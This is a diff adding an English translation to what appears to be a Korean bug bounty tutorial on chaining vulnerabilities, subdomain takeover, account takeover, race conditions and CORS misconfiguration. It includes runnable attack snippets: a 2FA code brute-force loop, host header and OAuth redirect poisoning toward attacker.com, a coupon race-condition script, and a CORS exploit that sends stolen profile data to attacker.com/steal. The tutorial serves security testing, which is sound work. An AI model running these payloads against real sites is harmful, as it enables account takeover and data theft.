@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 버그바운티 고급 — 취약점 체인·서브도메인 테이크오버·계정 탈취
 
 ## 1. 취약점 체이닝 전략
@@ -503,3 +509,190 @@ if __name__ == "__main__":
 | 2FA 우회 | 코드 재사용·속도 제한 없음·백업 코드 |
 | OAuth | state 파라미터 검증 누락·CSRF |
 | SSRF | DNS Rebinding·IPv6·프로토콜 래퍼 |
+
+---
+
+<a name="english"></a>
+
+# Bug Bounty Advanced — Vulnerability Chains, Subdomain Takeover, Account Takeover
+
+## 1. Vulnerability Chaining Strategy
+
+Chaining vulnerabilities together increases severity (CVSS) and rewards more than single vulnerabilities.
+
+```
+Classic Vulnerability Chains:
+
+SSRF + IDOR → Internal API access + data extraction
+Open Redirect + XSS → Phishing + session hijacking  
+CORS misconfiguration + XSS → Cross-domain data extraction
+Subdomain Takeover + XSS → Cookie theft on main domain
+```
+
+---
+
+## 2. Subdomain Takeover
+
+Subdomain takeover occurs when a subdomain's DNS points to a service that no longer exists — an attacker can register that service and control the subdomain.
+
+```bash
+# Detection method
+# 1. Enumerate all subdomains
+subfinder -d target.com -o subdomains.txt
+
+# 2. Check HTTP responses
+cat subdomains.txt | httpx -status-code -title
+
+# 3. Look for takeover-possible error messages:
+# "There isn't a GitHub Pages site here"  → GitHub Pages
+# "NoSuchBucket"                          → AWS S3
+# "This domain is not configured"         → Netlify
+# "Fastly error: unknown domain"          → Fastly CDN
+
+# Vulnerable DNS CNAME check
+dig sub.target.com CNAME
+# If CNAME points to subdomain.github.io but that repo doesn't exist → Takeover possible
+
+# Auto-detection tools
+subjack -w subdomains.txt -t 100 -o takeover_results.txt
+nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/
+```
+
+---
+
+## 3. Account Takeover (ATO)
+
+### 3-1. Password Reset Vulnerabilities
+
+```bash
+# 1. Reset token entropy analysis
+# Request multiple reset tokens and compare
+for i in {1..10}; do
+    curl -s -X POST https://target.com/forgot-password \
+        -d "email=victim@example.com" | grep -o "token=[a-zA-Z0-9]*"
+done
+
+# 2. Host header injection
+POST /forgot-password HTTP/1.1
+Host: attacker.com  # Poison reset link to attacker domain
+
+# 3. Reset token reuse (token not invalidated after use)
+curl -X POST https://target.com/reset-password \
+    -d "token=USED_TOKEN&password=newpass"
+
+# 4. Long expiry (token valid for 24h+)
+# Use old token after 1 hour to verify
+```
+
+### 3-2. OAuth Vulnerabilities
+
+```bash
+# OAuth CSRF (state parameter missing)
+# If no state parameter in authorization request:
+# Craft authorization URL → victim visits it → attacker binds their account
+
+# Redirect URI bypass
+https://target.com/oauth/callback?
+  code=AUTH_CODE&
+  redirect_uri=https://attacker.com  # Parameter manipulation
+
+# Implicit flow token leakage
+# Check Referer header — may leak access_token to external sites
+```
+
+### 3-3. 2FA Bypass
+
+```bash
+# 1. Code reuse (expired code still works)
+# 2. No rate limit → brute force 6-digit OTP
+for code in $(seq -w 000000 999999); do
+    result=$(curl -s -X POST https://target.com/2fa \
+        -d "code=$code&session=TOKEN")
+    if echo "$result" | grep -q "success"; then
+        echo "Valid 2FA code: $code"
+        break
+    fi
+done
+
+# 3. Backup code enumeration
+# 4. Skip 2FA step (direct access to post-2FA endpoint)
+curl https://target.com/dashboard -H "Cookie: pre_2fa_session=..."
+```
+
+---
+
+## 4. Race Condition
+
+```python
+import threading
+import requests
+
+def race_condition_test(url: str, token: str, count: int = 50):
+    """Race condition exploit using simultaneous requests"""
+    
+    results = []
+    lock = threading.Lock()
+    
+    def send_request():
+        resp = requests.post(url, 
+                            headers={"Authorization": f"Bearer {token}"},
+                            json={"action": "redeem_coupon", "code": "DISCOUNT50"})
+        with lock:
+            results.append(resp.status_code)
+    
+    threads = [threading.Thread(target=send_request) for _ in range(count)]
+    
+    # Start all threads simultaneously
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    
+    success_count = results.count(200)
+    print(f"Successful requests: {success_count}/{count}")
+    if success_count > 1:
+        print("[!] Race condition possible — coupon applied multiple times")
+    
+    return results
+```
+
+---
+
+## 5. CORS Misconfiguration
+
+```bash
+# CORS misconfiguration test
+curl -H "Origin: https://attacker.com" \
+     -H "Access-Control-Request-Method: GET" \
+     -X OPTIONS https://api.target.com/user/profile
+
+# If response contains:
+# Access-Control-Allow-Origin: https://attacker.com
+# Access-Control-Allow-Credentials: true
+# → Steal cross-origin data
+
+# Exploitation script
+# <script>
+# fetch('https://api.target.com/user/profile', {credentials: 'include'})
+#   .then(r => r.json())
+#   .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
+# </script>
+
+# Bypass patterns
+"origin": "https://target.com.attacker.com"  # Origin mismatch
+"origin": "null"                              # Null origin (sandboxed iframe)
+```
+
+---
+
+## 6. Advanced Automation Tools
+
+| Category | Tool |
+|---------|------|
+| Subdomain | amass + subfinder + httpx pipeline |
+| JS Analysis | linkfinder + secretfinder for endpoint detection |
+| GraphQL | InQL Scanner + batch query vulnerabilities |
+| Race Condition | Turbo Intruder concurrent requests |
+| 2FA Bypass | Code reuse, no rate limit, backup codes |
+| OAuth | Missing state parameter validation, CSRF |
+| SSRF | DNS Rebinding, IPv6, protocol wrappers |
